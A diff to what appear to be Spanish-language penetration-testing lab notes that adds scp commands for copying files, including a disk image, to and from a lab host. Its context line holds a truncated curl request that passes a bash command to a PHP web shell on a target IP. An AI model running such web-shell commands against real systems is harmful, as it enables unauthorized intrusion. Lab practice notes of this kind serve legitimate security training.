@@ -387,3 +387,10 @@ curl -X POST http://10.10.10.143/diego.php --data-urlencode 'cmd=bash -c "bash -
 *****************************************************Magic Binary******************************************************
 https://en.wikipedia.org/wiki/List_of_file_signatures
 máquina swagshop
+
+
+***************************************************SCP************************************************************
+copiar local al servidor
+scp archivo.txt user@10.10.10.48:/home/usr/
+copiar del servidor al local
+scp user@10.10.10.48:/home/pi/usb.dd .
